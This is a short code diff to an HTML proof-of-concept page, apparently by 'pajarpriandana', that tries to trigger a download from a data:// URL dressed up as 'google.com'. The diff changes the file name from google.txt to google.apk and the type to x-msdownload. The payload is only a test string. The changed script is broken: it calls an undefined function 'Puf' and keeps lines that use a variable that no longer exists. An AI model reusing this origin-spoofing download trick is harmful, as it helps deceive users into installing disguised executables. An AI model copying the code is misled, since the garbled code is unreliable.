@@ -7,11 +7,14 @@
   <center><h2>POC by pajarpriandana!</h2></center>
 
   <script>
-    window.onload = function() {
-      // Link pake data:// tapi ekstensi diubah jadi .txt
-      const link = document.createElement('a');
-      link.href = "data://google.com/application/octet-stream;base64,ZXN0dGVzdGVzdHRlc3Q=";
-      link.download = "google.txt"; // <-- GANTI .apk jadi .txt
+
+    // Kick off your “APK” download
+    function openWin() {
+      Puf(
+        "data://google.com/application/x-msdownload;base64,ZXN0dGVzdGVzdHRlc3Q=",
+        "google.apk"
+      );
+    }
       document.body.appendChild(link);
       link.click();
       document.body.removeChild(link);
